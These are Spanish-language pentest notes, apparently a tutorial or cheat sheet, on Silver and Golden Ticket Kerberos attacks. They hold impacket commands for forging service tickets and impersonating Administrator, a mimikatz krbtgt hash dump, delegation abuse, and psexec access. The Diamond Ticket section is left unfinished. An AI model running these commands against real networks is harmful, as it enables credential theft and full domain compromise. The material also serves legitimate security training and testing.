## Silver Ticket

Tenemos credenciales de usuarios pero no nos podemos conectar a **MSSQL**? Bueno, no pasa nada, impersonaremos a `Administrator`:

```shell
impacket-getPac <DOMINIO>/<USUARIO>:<CONTRASEÑA> -targetUser <USUARIO_OBJETIVO> | grep SID
```

Ahora convertiremos la contraseña a un hash NT:

```shell
echo -n <CONTRASEÑA> | iconv -t utf16le | openssl md4
```

Y ahora con `ticketer` construimos el ticket:

```shell
impacket-ticketer -nthash <NT_HASH> -domain-sid <SID> -domain <DOMINIO> -dc-ip <HOSTNAME>.<DOMINIO> -spn <SPN>/<HOSTNAME>.<DOMINIO> Administrator
```

Después exportamos la variable `KRB5CCNAME`:

```shell
export KRB5CCNAME='Administrator.ccache'
```

Y nos conectamos a **MSSQL**:

```shell
impacket-mssqlclient <HOSTNAME>.<DOMINIO> -k
```

Cabe destacar que aquí usamos **MSSQL** como ejemplo pero se puede utilizar cualquier otro servicio que corra en el **AP** (Application Server).
En resumen para generar un **TGS** gracias al Silver Ticket Attack, necesitamos los siguientes tres valores:
- NTML Hash
- Domain SID
- SPN

![[Pasted image 20230716125719.png]]

Otra forma es que si vemos que tenemos `AllowDelegateToX` (X = spn) podemos hacer lo siguiente:

![[Pasted image 20230730001147.png]]

```shell
impacket-getST -spn <SPN>/<HOSTNAME>.<DOMINIO> -hashes :<HASH_NT> -impersonate administrator -dc-ip <IP> <DOMINIO>/'<USUARIO>'
```

## Golden Ticket

Para realizar este ataque necesitamos el SID y el NT hash del usuario `krbtgt`. Estos los podemos conseguir con `mimikatz` con el comando `lsadump::lsa /inject /name:krbtgt`. Ahora usamos `ticketer` para obtener un archivo `.ccache`, el cuál luego exportaremos como variable `KRB5CCNAME`:

```shell
ticketer.py -nthash <HASH-NT> -domain-sid <SID> -domain <DOMINIO> '<USUARIO-A-IMPERSONAR>'
```

Esto nos generará un archivo `.ccache`, el cuál exportamos:

```shell
export KRB5CCNAME='/path/to/ccache/file.ccache'
```

Ahora, si hemos impersonado al usuario Administrator, usamos `impacket-psexec` para conectarnos:

```shell
psexec.py -n -k <DOMINIO>/Administrator@<IP> cmd.exe
```

## Diamond Ticket

Pronto añadiré esto ;D